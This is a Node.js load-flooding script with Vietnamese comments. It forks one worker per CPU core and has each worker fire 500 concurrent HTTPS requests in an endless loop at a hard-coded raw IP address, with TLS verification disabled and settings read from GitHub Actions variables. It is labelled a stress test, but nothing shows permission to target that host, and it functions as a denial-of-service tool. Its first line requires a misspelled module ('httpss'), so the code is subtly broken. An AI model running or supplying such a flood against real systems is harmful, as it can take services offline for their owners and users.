const https = require('httpss');
const cluster = require('cluster');
const os = require('os');

// --- CẤU HÌNH ---
// Lấy giá trị từ biến môi trường của GitHub Actions, hoặc dùng giá trị mặc định
const TARGET_URL = process.env.TARGET_URL || 'https://198.16.110.165/';
const DURATION_SECONDS = parseInt(process.env.DURATION_SECONDS, 10) || 60;
const CONCURRENT_REQUESTS_PER_WORKER = parseInt(process.env.CONCURRENCY_PER_WORKER, 10) || 500;
// -----------------

const numCPUs = os.cpus().length;

// Tạo một HTTP Agent để tái sử dụng kết nối (HTTP Keep-Alive)
// Đây là yếu tố cực kỳ quan trọng để đạt RPS cao với HTTP/1.1
const agent = new https.Agent({
    keepAlive: true,
    maxSockets: CONCURRENT_REQUESTS_PER_WORKER, // Số kết nối tối đa trong pool
    rejectUnauthorized: false // Bỏ qua lỗi chứng chỉ SSL/TLS (quan trọng khi target là IP)
});

if (cluster.isPrimary) {
    console.log(`✅ Primary process ${process.pid} is running.`);
    console.log(`🎯 Target: ${TARGET_URL}`);
    console.log(`⏱️ Duration: ${DURATION_SECONDS} seconds`);
    console.log(`⚙️ Concurrency per worker: ${CONCURRENT_REQUESTS_PER_WORKER}`);
    console.log(`🚀 Forking for ${numCPUs} CPUs...`);

    let totalRequests = 0;
    let totalErrors = 0;

    const workers = [];
    for (let i = 0; i < numCPUs; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalRequests += msg.data.success;
                totalErrors += msg.data.errors;
            }
        });
    }

    // Theo dõi và báo cáo tổng RPS
    const interval = setInterval(() => {
        console.log(`📊 Total Stats: ${totalRequests} Success, ${totalErrors} Errors | RPS: ~${(totalRequests / 10).toFixed(0)}`);
        totalRequests = 0;
        totalErrors = 0;
    }, 10000); // Báo cáo mỗi 10 giây

    setTimeout(() => {
        console.log('🛑 Time is up! Stopping all workers.');
        workers.forEach(worker => worker.kill());
        clearInterval(interval);
        process.exit(0);
    }, DURATION_SECONDS * 1000);


    cluster.on('exit', (worker, code, signal) => {
        console.log(`❌ Worker ${worker.process.pid} died.`);
    });

} else {
    // Đây là code chạy trên mỗi Worker Process
    let successCount = 0;
    let errorCount = 0;
    let running = true;

    process.on('SIGTERM', () => { // Bắt tín hiệu dừng từ primary process
        running = false;
    });

    // Gửi thống kê về cho primary process mỗi 10 giây
    setInterval(() => {
        process.send({ type: 'stats', data: { success: successCount, errors: errorCount } });
        successCount = 0;
        errorCount = 0;
    }, 10000);


    const sendRequest = () => {
        return new Promise((resolve) => {
            const req = https.get(TARGET_URL, { agent }, (res) => {
                // Đọc dữ liệu để giải phóng bộ nhớ, dù không dùng đến
                res.on('data', () => {});
                res.on('end', () => {
                    successCount++;
                    resolve();
                });
            });

            req.on('error', (e) => {
                errorCount++;
                resolve(); // Vẫn resolve để vòng lặp tiếp tục
            });

            req.end();
        });
    };

    const runStressTest = async () => {
        console.log(`🔥 Worker ${process.pid} started.`);
        while (running) {
            const promises = [];
            for (let i = 0; i < CONCURRENT_REQUESTS_PER_WORKER; i++) {
                promises.push(sendRequest());
            }
            // Đợi tất cả request trong một batch hoàn thành rồi mới bắt đầu batch tiếp theo
            await Promise.all(promises);
        }
        console.log(`✋ Worker ${process.pid} stopping.`);
    };

    runStressTest();
}
